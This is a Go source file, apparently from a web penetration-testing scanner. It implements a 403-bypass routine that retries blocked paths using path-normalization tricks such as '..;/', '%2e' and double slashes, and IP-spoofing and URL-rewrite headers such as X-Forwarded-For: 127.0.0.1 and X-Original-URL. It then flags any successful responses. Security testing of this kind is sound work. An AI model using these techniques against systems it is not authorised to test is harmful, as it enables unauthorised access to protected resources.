package engine

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strings"
)

type bypass403Technique struct {
	Name    string
	Path    string
	Headers map[string]string
}

type bypassBaselineSizeKey struct{}

// Run403Bypass executes a bounded set of path-normalization and IP-spoofing
// tricks against a blocked request and emits any successful bypasses directly
// into the engine result stream.
func Run403Bypass(ctx context.Context, e *Engine, targetURL string, reqPath string, method string, originalHeaders map[string]string, snap *configSnapshot) {
	if e == nil || snap == nil {
		return
	}
	if ctx == nil {
		ctx = context.Background()
	}

	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = http.MethodGet
	}

	targetURL = strings.TrimSpace(targetURL)
	reqPath = strings.TrimSpace(reqPath)
	if targetURL == "" || reqPath == "" {
		return
	}

	baselineSize, _ := ctx.Value(bypassBaselineSizeKey{}).(int)
	bypassBaseHeaders := cloneHeadersMapSafe(originalHeaders)
	if bypassBaseHeaders == nil {
		bypassBaseHeaders = make(map[string]string)
	}

	techniques := build403BypassTechniques(reqPath)
	if len(techniques) == 0 {
		return
	}

	for _, technique := range techniques {
		select {
		case <-ctx.Done():
			return
		default:
		}

		headersForRequest := cloneHeadersMapSafe(bypassBaseHeaders)
		if headersForRequest == nil {
			headersForRequest = make(map[string]string)
		}
		for k, v := range technique.Headers {
			headersForRequest[k] = v
		}

		reqHeaders := formatHeaderBlock(headersForRequest, reqPath)
		rawReq := buildRequest(method, technique.Path, hostFromURL(targetURL), snap.UserAgent, reqHeaders, snap.RequestBody)

		timeout := snap.Timeout
		if timeout <= 0 {
			timeout = DefaultHTTPTimeout
		}

		resp, err := e.executeRequestWithRetry(ctx, targetURL, rawReq, timeout, snap.ProxyOut)
		if err != nil || resp == nil {
			continue
		}

		if !is403BypassSuccess(resp.StatusCode) {
			continue
		}
		if baselineSize >= 0 && len(resp.Body) == baselineSize {
			continue
		}

		resolvedURL := resolveBypassResultURL(targetURL, technique.Path)
		result := Result{
			Path:        technique.Path,
			Method:      method,
			StatusCode:  resp.StatusCode,
			Size:        len(resp.Body),
			Words:       -1,
			Lines:       -1,
			ContentType: resp.GetHeader("Content-Type"),
			Duration:    resp.Duration,
			URL:         resolvedURL,
			Labels:      []string{"BYPASS: " + technique.Name},
			Note:        fmt.Sprintf("Bypass technique succeeded: %s", technique.Name),
		}
		if snap.SaveRaw {
			result.Request = string(rawReq)
			result.Response = string(resp.Raw)
			result.RequestBytes = append([]byte(nil), rawReq...)
			result.ResponseBytes = append([]byte(nil), resp.Raw...)
		}
		e.handleResultNonBlocking(result)
		return
	}
}

func (e *Engine) schedule403BypassTask(ctx context.Context, targetURL, reqPath, method string, originalHeaders map[string]string, snap *configSnapshot) {
	if e == nil || snap == nil || !snap.FourOhThreeBypass || e.bypassSem == nil {
		return
	}
	select {
	case e.bypassSem <- struct{}{}:
		go func() {
			defer func() {
				if r := recover(); r != nil {
					e.emitLogEvent(LogLevelWarning, LogCategoryDiscovery, EventNetworkError, fmt.Sprintf("403 bypass task panicked: %v", r), map[string]interface{}{
						"target": targetURL,
						"path":   reqPath,
					})
				}
				<-e.bypassSem
			}()
			Run403Bypass(ctx, e, targetURL, reqPath, method, cloneHeadersMapSafe(originalHeaders), snap)
		}()
	default:
	}
}

func build403BypassTechniques(reqPath string) []bypass403Technique {
	reqPath = strings.TrimSpace(reqPath)
	if reqPath == "" {
		return nil
	}
	basePath, querySuffix := splitBypassPathQuery(reqPath)
	if basePath == "" {
		return nil
	}

	pathPermutations := []struct {
		name string
		path string
	}{
		{name: "path:%2e", path: "/%2e" + strings.TrimPrefix(basePath, "/") + querySuffix},
		{name: "path:slash-trailing", path: strings.TrimSuffix(basePath, "/") + "/" + querySuffix},
		{name: "path:double-slash", path: "//" + strings.TrimPrefix(basePath, "/") + querySuffix},
		{name: "path:space-suffix", path: basePath + "%20" + querySuffix},
		{name: "path:json-suffix", path: basePath + ".json" + querySuffix},
		{name: "path:dotdot-semi", path: strings.TrimSuffix(basePath, "/") + "..;/" + querySuffix},
		{name: "path:dotdot-semi-nested", path: strings.TrimSuffix(basePath, "/") + "/..;/" + querySuffix},
	}

	techniques := make([]bypass403Technique, 0, len(pathPermutations)+5)
	seen := make(map[string]struct{})
	add := func(t bypass403Technique) {
		key := t.Name + "|" + t.Path
		if len(t.Headers) > 0 {
			keys := make([]string, 0, len(t.Headers))
			for k := range t.Headers {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			for _, k := range keys {
				key += "|" + k + "=" + t.Headers[k]
			}
		}
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		techniques = append(techniques, t)
	}

	for _, perm := range pathPermutations {
		if perm.path != "" {
			add(bypass403Technique{Name: perm.name, Path: perm.path})
		}
	}

	headerSpoofs := []bypass403Technique{
		{Name: "xff-local", Path: reqPath, Headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{Name: "custom-ip-auth", Path: reqPath, Headers: map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
		{Name: "originating-ip", Path: reqPath, Headers: map[string]string{"X-Originating-IP": "127.0.0.1"}},
		{Name: "original-url", Path: reqPath, Headers: map[string]string{"X-Original-URL": reqPath}},
		{Name: "rewrite-url", Path: reqPath, Headers: map[string]string{"X-Rewrite-URL": reqPath}},
		{Name: "root+original-url", Path: "/", Headers: map[string]string{"X-Original-URL": reqPath}},
		{Name: "root+rewrite-url", Path: "/", Headers: map[string]string{"X-Rewrite-URL": reqPath}},
	}
	for _, t := range headerSpoofs {
		add(t)
	}

	return techniques
}

func is403BypassSuccess(status int) bool {
	switch status {
	case http.StatusOK, http.StatusCreated, http.StatusNoContent:
		return true
	default:
		return false
	}
}

func splitBypassPathQuery(reqPath string) (string, string) {
	reqPath = strings.TrimSpace(reqPath)
	if reqPath == "" {
		return "", ""
	}
	querySuffix := ""
	if idx := strings.Index(reqPath, "?"); idx >= 0 {
		querySuffix = reqPath[idx:]
		reqPath = reqPath[:idx]
	}
	if reqPath == "" {
		reqPath = "/"
	}
	if !strings.HasPrefix(reqPath, "/") {
		reqPath = "/" + reqPath
	}
	return reqPath, querySuffix
}

func formatHeaderBlock(headers map[string]string, blockedPath string) string {
	if len(headers) == 0 {
		return ""
	}
	keys := make([]string, 0, len(headers))
	for k := range headers {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var b strings.Builder
	for _, k := range keys {
		v := headers[k]
		v = strings.ReplaceAll(v, "{PAYLOAD}", blockedPath)
		b.WriteString(fmt.Sprintf("%s: %s\r\n", sanitizeHeaderToken(k), sanitizeHeaderToken(v)))
	}
	return b.String()
}

func cloneHeadersMapSafe(in map[string]string) map[string]string {
	if len(in) == 0 {
		return nil
	}
	out := make(map[string]string, len(in))
	for k, v := range in {
		out[k] = v
	}
	return out
}

func hostFromURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	return u.Host
}

func resolveBypassResultURL(baseURL, reqPath string) string {
	u, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}
	if idx := strings.Index(reqPath, "?"); idx >= 0 {
		u.Path = reqPath[:idx]
		u.RawQuery = reqPath[idx+1:]
	} else {
		u.Path = reqPath
		u.RawQuery = ""
	}
	return u.String()
}
